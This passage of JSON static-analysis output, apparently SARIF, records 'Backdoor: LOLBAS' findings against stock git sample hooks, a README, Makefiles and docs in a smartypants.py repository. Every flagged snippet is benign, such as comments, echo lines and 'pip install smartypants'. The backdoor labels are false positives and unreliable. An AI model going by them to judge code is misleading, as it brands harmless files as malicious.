                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                    "rendered": {
                      "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                      "markdown": "`# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 58,
                  "endLine": 34,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 38,
                  "endLine": 34,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 63,
                  "endLine": 6,
                  "snippet": {
                    "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                    "rendered": {
                      "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                      "markdown": "`\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 58,
                  "endLine": 3,
                  "endColumn": 63,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 40,
                  "endLine": 122,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 11,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 39,
                  "endLine": 89,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                    "rendered": {
                      "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                      "markdown": "`\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 21,
                  "endLine": 34,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                    "rendered": {
                      "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                      "markdown": "`\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/tests/test_setup.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 30,
                  "endLine": 17,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            long_description = f.read()\n\n        overrides = {\n            # raises exception at warning level (2)\n            'halt_level': 2,\n            'raw_enabled': False,\n        }\n",
                    "rendered": {
                      "text": "            long_description = f.read()\n\n        overrides = {\n            # raises exception at warning level (2)\n            'halt_level': 2,\n            'raw_enabled': False,\n        }\n",
                      "markdown": "`            long_description = f.read()\n\n        overrides = {\n            # raises exception at warning level (2)\n            'halt_level': 2,\n            'raw_enabled': False,\n        }\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/README.rst"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 23,
                  "endLine": 40,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n",
                    "rendered": {
                      "text": "  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n",
                      "markdown": "`  text = '\"SmartyPants\" is smart, so is <code>smartypants</code> -- a Python port'\n  print(smartypants.smartypants(text))\n\nTo use the command-line script ``smartypants``:\n\n.. code:: sh\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/README.rst"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 1,
                  "endLine": 25,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\n.. code:: sh\n\n  pip install smartypants\n\n\nQuick usage\n",
                    "rendered": {
                      "text": "\n.. code:: sh\n\n  pip install smartypants\n\n\nQuick usage\n",
                      "markdown": "`\n.. code:: sh\n\n  pip install smartypants\n\n\nQuick usage\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/Makefile"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 47,
                  "endLine": 43,
                  "snippet": {
                    "text": "#    would result an error about unexpected section heading.\n#\n#\t2. making a smartypants.py as a package, so a new module like\n#\t   smartypants.cli, just for the command-line script\n#\n# If you know a better solution for making documentation for smartypants\n# command, please open an issue to discuss. Right now, stick with this ugly\n# symlink.\n",
                    "rendered": {
                      "text": "#    would result an error about unexpected section heading.\n#\n#\t2. making a smartypants.py as a package, so a new module like\n#\t   smartypants.cli, just for the command-line script\n#\n# If you know a better solution for making documentation for smartypants\n# command, please open an issue to discuss. Right now, stick with this ugly\n# symlink.\n",
                      "markdown": "`#    would result an error about unexpected section heading.\n#\n#\t2. making a smartypants.py as a package, so a new module like\n#\t   smartypants.cli, just for the command-line script\n#\n# If you know a better solution for making documentation for smartypants\n# command, please open an issue to discuss. Right now, stick with this ugly\n# symlink.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/Makefile"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 64,
                  "endLine": 33,
                  "endColumn": 72,
                  "snippet": {
                    "text": "docs/_build/html: $(DOC_FILES) smartypants.py smartypants_command.py\n\tmake -C docs html\n\n# FIXME making a symlink is just an workaround since smartypants script isn't\n# importable, therefore Sphinx autodoc cannot pick it up. There are a couple of\n# options:\n#\n",
                    "rendered": {
                      "text": "docs/_build/html: $(DOC_FILES) smartypants.py smartypants_command.py\n\tmake -C docs html\n\n# FIXME making a symlink is just an workaround since smartypants script isn't\n# importable, therefore Sphinx autodoc cannot pick it up. There are a couple of\n# options:\n#\n",
                      "markdown": "`docs/_build/html: $(DOC_FILES) smartypants.py smartypants_command.py\n\tmake -C docs html\n\n# FIXME making a symlink is just an workaround since smartypants script isn't\n# importable, therefore Sphinx autodoc cannot pick it up. There are a couple of\n# options:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/index.rst"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 67,
                  "endLine": 3,
                  "endColumn": 71,
                  "snippet": {
                    "text": ".. smartypants documentation master file, created by\n   sphinx-quickstart on Fri Aug 23 12:43:22 2013.\n   You can adapt this file completely to your liking, but it should at least\n   contain the root `toctree` directive.\n\nWelcome to smartypants documentation!\n",
                    "rendered": {
                      "text": ".. smartypants documentation master file, created by\n   sphinx-quickstart on Fri Aug 23 12:43:22 2013.\n   You can adapt this file completely to your liking, but it should at least\n   contain the root `toctree` directive.\n\nWelcome to smartypants documentation!\n",
                      "markdown": "`.. smartypants documentation master file, created by\n   sphinx-quickstart on Fri Aug 23 12:43:22 2013.\n   You can adapt this file completely to your liking, but it should at least\n   contain the root `toctree` directive.\n\nWelcome to smartypants documentation!\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/Makefile"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 57,
                  "endLine": 152,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\ndoctest:\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n",
                    "rendered": {
                      "text": "\ndoctest:\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n",
                      "markdown": "`\ndoctest:\n\t$(SPHINXBUILD) -b doctest $(ALLSPHINXOPTS) $(BUILDDIR)/doctest\n\t@echo \"Testing of doctests in the sources finished, look at the \" \\\n\t      \"results in $(BUILDDIR)/doctest/output.txt.\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/development.rst"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 6,
                  "endLine": 84,
                  "endColumn": 12,
                  "snippet": {
                    "text": "Reporting\n=========\n\nPlease head over to Issues_ and create an issue for a bug report or feature\nrequest.\n\n.. _Issues: https://bitbucket.org/livibetter/smartypants.py/issues\n",
                    "rendered": {
                      "text": "Reporting\n=========\n\nPlease head over to Issues_ and create an issue for a bug report or feature\nrequest.\n\n.. _Issues: https://bitbucket.org/livibetter/smartypants.py/issues\n",
                      "markdown": "`Reporting\n=========\n\nPlease head over to Issues_ and create an issue for a bug report or feature\nrequest.\n\n.. _Issues: https://bitbucket.org/livibetter/smartypants.py/issues\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/development.rst"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 1,
                  "endLine": 49,
                  "endColumn": 6,
                  "snippet": {
                    "text": "For manual package installation test::\n\n  python setup.py sdist\n  pip install --user --upgrade dist/smartypants-<x.y.z>.tar.gz\n\n\nBuilding\n",
                    "rendered": {
                      "text": "For manual package installation test::\n\n  python setup.py sdist\n  pip install --user --upgrade dist/smartypants-<x.y.z>.tar.gz\n\n\nBuilding\n",
                      "markdown": "`For manual package installation test::\n\n  python setup.py sdist\n  pip install --user --upgrade dist/smartypants-<x.y.z>.tar.gz\n\n\nBuilding\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/make.bat"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 55,
                  "endLine": 185,
                  "endColumn": 59,
                  "snippet": {
                    "text": "\t%SPHINXBUILD% -b doctest %ALLSPHINXOPTS% %BUILDDIR%/doctest\n\tif errorlevel 1 exit /b 1\n\techo.\n\techo.Testing of doctests in the sources finished, look at the ^\nresults in %BUILDDIR%/doctest/output.txt.\n\tgoto end\n)\n",
                    "rendered": {
                      "text": "\t%SPHINXBUILD% -b doctest %ALLSPHINXOPTS% %BUILDDIR%/doctest\n\tif errorlevel 1 exit /b 1\n\techo.\n\techo.Testing of doctests in the sources finished, look at the ^\nresults in %BUILDDIR%/doctest/output.txt.\n\tgoto end\n)\n",
                      "markdown": "`\t%SPHINXBUILD% -b doctest %ALLSPHINXOPTS% %BUILDDIR%/doctest\n\tif errorlevel 1 exit /b 1\n\techo.\n\techo.Testing of doctests in the sources finished, look at the ^\nresults in %BUILDDIR%/doctest/output.txt.\n\tgoto end\n)\n`"
                    }
                  },
                  "sourceLanguage": "wincmdscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/info/exclude"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                    "rendered": {
                      "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                      "markdown": "`# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                    "rendered": {
